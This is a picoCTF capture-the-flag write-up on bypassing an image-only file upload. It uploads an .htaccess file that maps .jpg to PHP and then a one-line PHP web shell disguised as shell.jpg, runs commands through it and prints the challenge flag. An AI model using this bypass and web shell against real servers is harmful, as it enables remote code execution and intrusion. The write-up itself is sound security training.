# byp4ss3d

#### Challenge :&#x20;

<figure><img src="../../../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

We accessed the target website and identified a file upload functionality.\
File upload features are commonly associated with Remote Code Execution (RCE) vulnerabilities, so this immediately caught our attention.

However, the application only allowed image file formats such as **JPG, PNG, and GIF**, while direct upload of executable files like **PHP** was restricted.

Since achieving RCE typically requires uploading a server-side executable file (e.g., a PHP web shell), we decided to further analyze and attempt to bypass the file upload restrictions.

<figure><img src="../../../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

I tried uploading `cmd.php`.\
**Result**: ❌ _"Only images allowed!"_

I tried `cmd.jpg.php`.\
**Result**: ❌ _"Nice try, script kiddie!"_

<figure><img src="../../../../.gitbook/assets/image (382).png" alt=""><figcaption></figcaption></figure>

Apache can be tricked into executing non-PHP files as PHP with a .htaccess file. Try uploading more than just one file.

First I Upload `.htaccess` file !

```
Content-Type: image/jpg
```

```
AddType application/x-httpd-php .jpg
```

<figure><img src="../../../../.gitbook/assets/image (386).png" alt=""><figcaption></figcaption></figure>

Then I Upload `shell.jpg`&#x20;

```
<?php system($_GET['cmd']); ?>
```

```
Content-Type: image/jpg
```

<figure><img src="../../../../.gitbook/assets/image (387).png" alt=""><figcaption></figcaption></figure>

Then I visit The Endpoint of Image `/images/shell.jpg?cmd=id` and boom!!



<figure><img src="../../../../.gitbook/assets/image (388).png" alt=""><figcaption></figcaption></figure>

Then I `cat` the `flag` in web root directory |

<figure><img src="../../../../.gitbook/assets/image (389).png" alt=""><figcaption></figcaption></figure>



```
Flag: picoCTF{s3rv3r_byp4ss_39f9de85}
```
